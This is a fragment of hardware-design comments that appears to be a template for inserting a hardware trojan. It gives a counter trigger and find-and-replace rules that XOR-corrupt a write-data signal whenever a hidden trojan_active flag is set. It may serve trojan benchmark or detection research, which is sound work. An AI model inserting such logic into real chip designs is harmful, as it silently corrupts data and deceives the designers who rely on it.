 ...
 *   
 * Trigger: Counter on wr_data_i
 * Payload: Corrupt wr_data_i with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt wr_data_i with XOR
//
// Integration Script Must Modify:
//
// IF wr_data_i is assigned:
//   Find: assign wr_data_i = data_value;
//   Replace: assign wr_data_i = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF wr_data_i is in always_ff:
//   Find: wr_data_i <= data_value;
//   Replace: wr_data_i <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
